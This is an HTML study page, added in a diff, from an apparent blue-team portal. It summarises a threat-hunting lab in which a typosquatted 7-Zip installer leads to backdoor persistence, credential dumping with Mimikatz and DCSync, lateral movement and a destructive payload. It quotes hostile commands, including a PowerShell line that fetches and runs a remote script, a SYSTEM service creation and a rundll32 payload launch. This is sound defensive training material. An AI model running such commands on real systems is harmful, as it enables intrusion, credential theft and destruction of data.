@@ -1,0 +1,145 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <title>Summary Report | Blue Team Study Portal</title>
+  <link rel="stylesheet" href="../style.css">
+</head>
+<body class="min-h-screen bg-slate-950 text-slate-100 antialiased">
+  <div class="app-shell">
+    <aside class="sidebar">
+    <a class="brand" href="../index.html"><span>BT</span><strong>Blue Team Study Portal</strong></a>
+    <button class="command-button" type="button" id="openCommand">Search / Quick jump <kbd>Ctrl K</kbd></button>
+    <label class="search-box"><span>Search notes</span><input id="globalSearch" type="search" placeholder="Search MITRE, commands, topics"></label>
+    <div id="searchResults" class="search-results" hidden></div>
+    <nav><details class="side-level" open><summary><strong>L1</strong><span>Initial Triage &amp; Fundamentals</span></summary><details class="side-section"><summary>SOC &amp; Incident Response Basics<span>5</span></summary><a class="side-link " href="../pages/soc-essentials.html"><span>SOC Essentials</span><em>0 nodes</em></a><a class="side-link " href="../pages/what-is-incident-response.html"><span>What is Incident Response?</span><em>0 nodes</em></a><a class="side-link " href="../pages/incident-response-cycle.html"><span>Incident Response Cycle</span><em>0 nodes</em></a><a class="side-link " href="../pages/frameworks.html"><span>Frameworks</span><em>5 nodes</em></a><a class="side-link " href="../pages/the-hive.html"><span>The Hive</span><em>0 nodes</em></a></details><details class="side-section"><summary>Operating System &amp; Command Line Basics<span>4</span></summary><a class="side-link " href="../pages/important-windows-directories.html"><span>Important Windows Directories</span><em>0 nodes</em></a><a class="side-link " href="../pages/windows-command-line-tools.html"><span>Windows command-line &amp; tools</span><em>0 nodes</em></a><a class="side-link " href="../pages/intro-to-powershell.html"><span>Intro to PowerShell</span><em>0 nodes</em></a><a class="side-link " href="../pages/linux-cheatsheet.html"><span>Linux CheatSheet</span><em>0 nodes</em></a></details><details class="side-section"><summary>Networking &amp; Web Basics<span>3</span></summary><a class="side-link " href="../pages/network.html"><span>Network</span><em>4 nodes</em></a><a class="side-link " href="../pages/network-defenses.html"><span>Network Defenses</span><em>0 nodes</em></a><a class="side-link " href="../pages/web-fundamentals.html"><span>Web Fundamentals</span><em>0 nodes</em></a></details><details class="side-section"><summary>Initial Triage &amp; Analysis<span>3</span></summary><a class="side-link " href="../pages/phishing-analysis.html"><span>Phishing analysis</span><em>14 nodes</em></a><a class="side-link " href="../pages/phishing-analysis-labs.html"><span>Phishing Analysis Labs</span><em>13 nodes</em></a><a class="side-link " href="../pages/osint.html"><span>OSINT</span><em>0 nodes</em></a></details><details class="side-section"><summary>Tool Familiarity<span>3</span></summary><a class="side-link " href="../pages/logging-fundamentals.html"><span>Logging Fundamentals</span><em>0 nodes</em></a><a class="side-link " href="../pages/siem.html"><span>SIEM</span><em>0 nodes</em></a><a class="side-link " href="../pages/elk-elastic-stack.html"><span>ELK (Elastic Stack)</span><em>0 nodes</em></a></details></details><details class="side-level" ><summary><strong>L1.5</strong><span>Advanced Investigation &amp; Contextualization</span></summary><details class="side-section"><summary>Endpoint &amp; OS Investigation<span>5</span></summary><a class="side-link " href="../pages/windows-event-ids.html"><span>Windows Event IDs</span><em>9 nodes</em></a><a class="side-link " href="../pages/windows-processes.html"><span>Windows processes</span><em>0 nodes</em></a><a class="side-link " href="../pages/windows-security-monitoring.html"><span>Windows Security Monitoring</span><em>4 nodes</em></a><a class="side-link " href="../pages/sysinternals.html"><span>Sysinternals</span><em>0 nodes</em></a><a class="side-link " href="../pages/edr-endpoint-detection-and-response.html"><span>EDR (Endpoint Detection and Response)</span><em>0 nodes</em></a></details><details class="side-section"><summary>Advanced Querying<span>4</span></summary><a class="side-link " href="../pages/splunk.html"><span>Splunk</span><em>0 nodes</em></a><a class="side-link " href="../pages/splunk-filters.html"><span>Splunk Filters</span><em>0 nodes</em></a><a class="side-link " href="../pages/log-analysis-labs.html"><span>Log Analysis Labs</span><em>15 nodes</em></a><a class="side-link " href="../pages/regex.html"><span>Regex</span><em>0 nodes</em></a></details><details class="side-section"><summary>Contextualizing Threats<span>3</span></summary><a class="side-link " href="../pages/threat-intelligence.html"><span>Threat Intelligence</span><em>6 nodes</em></a><a class="side-link " href="../pages/threat-intelligence-labs.html"><span>Threat Intelligence Labs</span><em>18 nodes</em></a><a class="side-link " href="../pages/threat-intelligence-toolkit.html"><span>Threat Intelligence Toolkit</span><em>1 nodes</em></a></details><details class="side-section"><summary>Network Investigation<span>1</span></summary><a class="side-link " href="../pages/network-analysis-tools.html"><span>Network Analysis Tools</span><em>3 nodes</em></a></details></details><details class="side-level" ><summary><strong>L2</strong><span>DFIR, Threat Hunting &amp; Engineering</span></summary><details class="side-section"><summary>Proactive Threat Hunting<span>6</span></summary><a class="side-link " href="../pages/hunting-persistence-mitre-ta0003.html"><span>Hunting Persistence (MITRE TA0003)</span><em>11 nodes</em></a><a class="side-link " href="../pages/hunting-lateral-movement-mitre-ta0008.html"><span>Hunting Lateral Movement (MITRE TA0008)</span><em>4 nodes</em></a><a class="side-link " href="../pages/hunting-discovery-mitre-ta0007.html"><span>Hunting Discovery (MITRE TA0007)</span><em>0 nodes</em></a><a class="side-link " href="../pages/threat-hunting-module.html"><span>Threat Hunting module</span><em>6 nodes</em></a><a class="side-link " href="../pages/threat-hunting-labs-siem.html"><span>Threat hunting Labs (SIEM)</span><em>27 nodes</em></a><a class="side-link " href="../pages/100-splunk-use-cases.html"><span>+100 Splunk Use Cases</span><em>0 nodes</em></a></details><details class="side-section"><summary>Digital Forensics (DFIR)<span>8</span></summary><a class="side-link " href="../pages/digital-forensics.html"><span>Digital Forensics</span><em>9 nodes</em></a><a class="side-link " href="../pages/windows-forensics.html"><span>Windows Forensics</span><em>22 nodes</em></a><a class="side-link " href="../pages/forensics-labs.html"><span>Forensics Labs</span><em>15 nodes</em></a><a class="side-link " href="../pages/memory-forensics.html"><span>Memory forensics</span><em>0 nodes</em></a><a class="side-link " href="../pages/memory-forensics-labs.html"><span>Memory Forensics Labs</span><em>19 nodes</em></a><a class="side-link " href="../pages/volatility.html"><span>Volatility</span><em>5 nodes</em></a><a class="side-link " href="../pages/linux-artifacts-forensic-evidence-collection.html"><span>Linux Artifacts &amp; Forensic Evidence Collection</span><em>7 nodes</em></a><a class="side-link " href="../pages/stenography.html"><span>Stenography</span><em>0 nodes</em></a></details><details class="side-section"><summary>Advanced Attack Vectors &amp; Internals<span>9</span></summary><a class="side-link " href="../pages/active-directory.html"><span>Active Directory</span><em>7 nodes</em></a><a class="side-link " href="../pages/kerberos-authentication.html"><span>Kerberos authentication</span><em>0 nodes</em></a><a class="side-link " href="../pages/detecting-ad-attacks.html"><span>Detecting AD Attacks</span><em>15 nodes</em></a><a class="side-link " href="../pages/detecting-active-directory-attacks-htb.html"><span>Detecting Active Directory Attacks / HTB</span><em>6 nodes</em></a><a class="side-link " href="../pages/windows-internals.html"><span>Windows Internals</span><em>0 nodes</em></a><a class="side-link " href="../pages/command-and-control.html"><span>Command-and-Control (C2)</span><em>0 nodes</em></a><a class="side-link " href="../pages/command-and-control-c2-evasion-techniques.html"><span>Command-and-Control (C2) Evasion Techniques</span><em>0 nodes</em></a><a class="side-link " href="../pages/detecting-web-attacks.html"><span>Detecting Web Attacks</span><em>8 nodes</em></a><a class="side-link " href="../pages/network-analysis-labs.html"><span>Network Analysis Labs</span><em>28 nodes</em></a></details><details class="side-section"><summary>Detection Engineering &amp; Automation<span>6</span></summary><a class="side-link " href="../pages/detection-engineering.html"><span>Detection Engineering</span><em>0 nodes</em></a><a class="side-link " href="../pages/sigma.html"><span>Sigma</span><em>0 nodes</em></a><a class="side-link " href="../pages/yara.html"><span>Yara</span><em>0 nodes</em></a><a class="side-link " href="../pages/atomic-red-team.html"><span>Atomic Red Team</span><em>0 nodes</em></a><a class="side-link " href="../pages/threat-modelling.html"><span>Threat Modelling</span><em>5 nodes</em></a><a class="side-link " href="../pages/ad-hardening.html"><span>AD Hardening</span><em>0 nodes</em></a></details><details class="side-section"><summary>Advanced Scripting &amp; Analysis Tooling<span>6</span></summary><a class="side-link " href="../pages/powershell-for-incident-response.html"><span>PowerShell for Incident Response</span><em>0 nodes</em></a><a class="side-link " href="../pages/powershell-detection.html"><span>Powershell Detection</span><em>0 nodes</em></a><a class="side-link " href="../pages/powershell-logs.html"><span>PowerShell Logs</span><em>0 nodes</em></a><a class="side-link " href="../pages/lolbins-living-off-the-land-binaries.html"><span>LOLBins (living-off-the-land binaries)</span><em>0 nodes</em></a><a class="side-link " href="../pages/osquery.html"><span>Osquery</span><em>0 nodes</em></a><a class="side-link " href="../pages/cryptography.html"><span>Cryptography</span><em>0 nodes</em></a></details></details></nav>
+  </aside>
+    <main class="content"><header class="topic-hero">
+      <div class="breadcrumbs"><a href="../index.html">Home</a><span>/</span><a href="threat-hunting-module.html">Threat Hunting module</a><span>/</span><a href="hunt-me-ii-typo-squatters.html">Hunt Me II Typo Squatters</a><span>/</span><span>Summary Report</span></div>
+      <h1>Summary Report</h1>
+      <p>1- Perry’s haste causes him to install a malicious 7-Zip clone from a typosquatting site.</p>
+      <div class="tag-row"><span class="tag level">L2</span><span class="tag">PowerShell</span><span class="tag">Windows</span><span class="tag">Active Directory</span><span class="tag">Kerberos</span><span class="tag">Memory</span><span class="tag">Lateral Movement</span></div>
+    </header>
+    <div class="reader-layout">
+      <aside class="secondary-nav">
+        <div class="secondary-heading"><span>Current Tree</span><strong>Threat Hunting module</strong></div>
+        <details class="tree-node" open>
+    <summary>
+      <a class="" href="threat-hunting-module.html"><span>Threat Hunting module</span><em>L2</em></a>
+      <b>6</b>
+    </summary>
+    <div class="tree-children"><details class="tree-node" open>
+    <summary>
+      <a class="" href="threat-hunting-introduction.html"><span>Threat Hunting Introduction</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="threat-hunting-foothold.html"><span>Threat Hunting Foothold</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="threat-hunting-pivoting.html"><span>Threat Hunting Pivoting</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="threat-hunting-endgame.html"><span>Threat Hunting Endgame</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="hunt-me-i-payment-collectors.html"><span>Hunt Me I Payment Collectors</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="hunt-me-ii-typo-squatters.html"><span>Hunt Me II Typo Squatters</span><em>L2</em></a>
+      <b>1</b>
+    </summary>
+    <div class="tree-children"><details class="tree-node" open>
+    <summary>
+      <a class="active" href="summary-report-9541433d.html"><span>Summary Report</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details></div>
+  </details></div>
+  </details>
+      </aside>
+      <article class="reader">
+        
+        <section class="study-grid">
+    <article><h2>Overview</h2><p>1- Perry’s haste causes him to install a malicious 7-Zip clone from a typosquatting site.</p></article>
+    <article><h2>Why It Matters In SOC</h2><p>Use this note as an analyst reference: understand the concept, identify the relevant telemetry, pivot through evidence, and document the decision path clearly.</p></article>
+    <article><h2>Key Concepts</h2><ul><li>Summary / Report</li><li>1- Perry’s haste causes him to install a malicious 7-Zip clone from a typosquatting site.</li><li>2- The user runs the fake 7-Zip installer.</li><li>3- The MSI stub immediately spawns PowerShell to fetch a hidden payload.</li><li>4- A legitimate 7-Zip installer is silently deployed to mask the attack.</li><li>5- A malicious back-door service is created.</li><li>6- The back-door loads a malicious DLL for code execution.</li><li>7- Credentials are dumped from memory.</li><li>8- Active Directory reconnaissance is performed.</li><li>9- Mimikatz is staged and NT hashes stolen.</li><li>10- Hashes are used to impersonate high-privilege users.</li><li>11- Lateral movement via credential reuse.</li></ul></article>
+    <article><h2>Analyst Workflow</h2><ul><li>Identify the user, host, process, network flow, or identity object involved.</li><li>Collect the highest-value logs first and preserve timestamps and assumptions.</li><li>Pivot through related notes, telemetry sources, and MITRE references.</li><li>Document findings, gaps, containment options, and detection improvements.</li></ul></article>
+    <article><h2>Splunk/SIEM Examples</h2><p class="muted">No direct examples extracted.</p></article>
+    <article><h2>Important Commands</h2><div class="code-shell"><div class="code-bar"><span>text</span><button class="copy-code" type="button">Copy</button></div><pre><code>iex (iwr http://www.7zipp.org/a/7z.ps1 -UseBasicParsing)
+</code></pre></div><div class="code-shell"><div class="code-bar"><span>text</span><button class="copy-code" type="button">Copy</button></div><pre><code>sc.exe create 7zService binpath=“…\7zipp.exe” start=auto obj=LocalSystem</code></pre></div><div class="code-shell"><div class="code-bar"><span>text</span><button class="copy-code" type="button">Copy</button></div><pre><code>rundll32.exe 7zipp.dll,Start</code></pre></div></article>
+    <article><h2>Tools Used</h2><ul><li>PowerShell</li></ul></article>
+    <article><h2>Notes/Tips</h2><p class="muted">No extracted items for this section.</p></article>
+  </section>
+        <section class="source-note"><h2>Original Notes</h2><h2 id="summary-report">Summary / Report</h2>
+<h4 id="1-perrys-haste-causes-him-to-install-a-malicious-7-zip-clone-from-a-typosquatting-site."><strong>1- Perry’s haste causes him to install a malicious 7-Zip clone from a typosquatting site.</strong></h4>
+<p>While under pressure to open an encrypted 7z archive his boss sent, Perry opened Chrome, searched for “7-Zip,” and—without verifying the source—clicked the first result (http://www.7zipp.org), inadvertently downloading a fake installer.</p>
+<h4 id="2-the-user-runs-the-fake-7-zip-installer."><strong>2- The user runs the fake 7-Zip installer.</strong></h4>
+<p>At 14:23:00, the user double-clicked “7z2301-x64.msi.” Windows unpacked it into a temporary stub (MSI542E.tmp) and executed it.</p>
+<h4 id="3-the-msi-stub-immediately-spawns-powershell-to-fetch-a-hidden-payload."><strong>3- The MSI stub immediately spawns PowerShell to fetch a hidden payload.</strong></h4>
+<p>At 14:23:02, MSI542E.tmp ran:</p>
+<div class="code-shell"><div class="code-bar"><span>text</span><button class="copy-code" type="button">Copy</button></div><pre><code class="language-text">iex (iwr http://www.7zipp.org/a/7z.ps1 -UseBasicParsing)
+</code></pre></div>
+<p>which downloads and executes “7z.ps1” directly in memory.</p>
+<h4 id="4-a-legitimate-7-zip-installer-is-silently-deployed-to-mask-the-attack."><strong>4- A legitimate 7-Zip installer is silently deployed to mask the attack.</strong></h4>
+<p>Seconds later, the script dropped and ran “7zlegit.exe /S,” installing genuine 7-Zip in silent mode so the system appears normal.</p>
+<h4 id="5-a-malicious-back-door-service-is-created."><strong>5- A malicious back-door service is created.</strong></h4>
+<p>At 14:23:23, the attacker ran:</p>
+<div class="code-shell"><div class="code-bar"><span>text</span><button class="copy-code" type="button">Copy</button></div><pre><code class="language-text">sc.exe create 7zService binpath=“…\7zipp.exe” start=auto obj=LocalSystem</code></pre></div>
+<p>and immediately started the service, running the attacker’s “7zipp.exe” as SYSTEM.</p>
+<h4 id="6-the-back-door-loads-a-malicious-dll-for-code-execution."><strong>6- The back-door loads a malicious DLL for code execution.</strong></h4>
+<p>“7zipp.exe” invoked:</p>
+<div class="code-shell"><div class="code-bar"><span>text</span><button class="copy-code" type="button">Copy</button></div><pre><code class="language-text">rundll32.exe 7zipp.dll,Start</code></pre></div>
+<p>handing control over to the embedded attacker payload under SYSTEM privileges.</p>
+<h4 id="7-credentials-are-dumped-from-memory."><strong>7- Credentials are dumped from memory.</strong></h4>
+<p>At 14:24:22, a NanoDump PowerShell script captured an LSASS memory dump, then at 14:25:18 PowerExtract parsed out NT hashes and Kerberos tickets—all in memory.</p>
+<h4 id="8-active-directory-reconnaissance-is-performed."><strong>8- Active Directory reconnaissance is performed.</strong></h4>
+<p>Immediately after, SharpHound (Invoke-Bloodhound) was run to enumerate domain relationships and identify high-value targets.</p>
+<h4 id="9-mimikatz-is-staged-and-nt-hashes-stolen."><strong>9- Mimikatz is staged and NT hashes stolen.</strong></h4>
+<p>At 14:28:53, Mimikatz was downloaded. By 14:29:43 it was used first to pass-the-hash as James Cromwell, then on a second host to perform a DCSync against Damian Hall’s account.</p>
+<h4 id="10-hashes-are-used-to-impersonate-high-privilege-users."><strong>10- Hashes are used to impersonate high-privilege users.</strong></h4>
+<p>Using sekurlsa::pth, new PowerShell sessions were launched as Damian Hall, granting full access to his credentials.</p>
+<h4 id="11-lateral-movement-via-credential-reuse."><strong>11- Lateral movement via credential reuse.</strong></h4>
+<p>The attacker reset anna.jones’s password (to “pwn3dpw!!!”) with PowerView, then used WinRM (Invoke-Command) and her credentials to deploy payloads across multiple hosts.</p>
+<h4 id="12-browser-stored-credentials-are-exfiltrated."><strong>12- Browser-stored credentials are exfiltrated.</strong></h4>
+<p>On each compromised system, SharpChromium and SharpChrome harvested saved passwords from Chrome and Edge.</p>
+<h4 id="13-privilege-escalation-in-active-directory."><strong>13- Privilege escalation in Active Directory.</strong></h4>
+<p>Anna was added to the “AD Recovery” group with IT-admin credentials, then SharpKatz DCSync was executed again—this time remotely via PowerShell—to pull additional hashes.</p>
+<h4 id="14-the-final-destructive-payload-is-deployed."><strong>14- The final destructive payload is deployed.</strong></h4>
+<p>In Perry Parsons’s profile directory, “777bomb.exe” was downloaded and run repeatedly likely triggering the ransomware or wiper component that completes the attack.</p>
+<hr></section>
+      </article>
+      <details class="toc" open><summary>Table of contents</summary><a href="#summary-report">Summary / Report</a><a href="#1-perrys-haste-causes-him-to-install-a-malicious-7-zip-clone-from-a-typosquatting-site.">1- Perry’s haste causes him to install a malicious 7-Zip clone from a typosquatting site.</a><a href="#2-the-user-runs-the-fake-7-zip-installer.">2- The user runs the fake 7-Zip installer.</a><a href="#3-the-msi-stub-immediately-spawns-powershell-to-fetch-a-hidden-payload.">3- The MSI stub immediately spawns PowerShell to fetch a hidden payload.</a><a href="#4-a-legitimate-7-zip-installer-is-silently-deployed-to-mask-the-attack.">4- A legitimate 7-Zip installer is silently deployed to mask the attack.</a><a href="#5-a-malicious-back-door-service-is-created.">5- A malicious back-door service is created.</a><a href="#6-the-back-door-loads-a-malicious-dll-for-code-execution.">6- The back-door loads a malicious DLL for code execution.</a><a href="#7-credentials-are-dumped-from-memory.">7- Credentials are dumped from memory.</a><a href="#8-active-directory-reconnaissance-is-performed.">8- Active Directory reconnaissance is performed.</a><a href="#9-mimikatz-is-staged-and-nt-hashes-stolen.">9- Mimikatz is staged and NT hashes stolen.</a><a href="#10-hashes-are-used-to-impersonate-high-privilege-users.">10- Hashes are used to impersonate high-privilege users.</a><a href="#11-lateral-movement-via-credential-reuse.">11- Lateral movement via credential reuse.</a><a href="#12-browser-stored-credentials-are-exfiltrated.">12- Browser-stored credentials are exfiltrated.</a><a href="#13-privilege-escalation-in-active-directory.">13- Privilege escalation in Active Directory.</a><a href="#14-the-final-destructive-payload-is-deployed.">14- The final destructive payload is deployed.</a></details>
+    </div>
+    
+    <footer class="pager"><a href="hunt-me-ii-typo-squatters.html">← Hunt Me II Typo Squatters</a><a href="windows-command-line-tools.html">Windows command-line &amp; tools →</a></footer></main>
+  </div>
+  <div class="lightbox" id="lightbox" hidden><button type="button" aria-label="Close image">×</button><img alt=""></div>
+  <div class="command-palette" id="commandPalette" hidden>
+    <div class="command-panel">
+      <div class="command-head"><strong>Quick jump</strong><button type="button" id="closeCommand">Close</button></div>
+      <input id="commandInput" type="search" placeholder="Search any note, tag, command, or MITRE ID">
+      <div id="commandResults" class="command-results"></div>
+    </div>
+  </div>
+  <script src="../data/json/search-index.js"></script>
+  <script src="../script.js"></script>
+</body>
+</html>
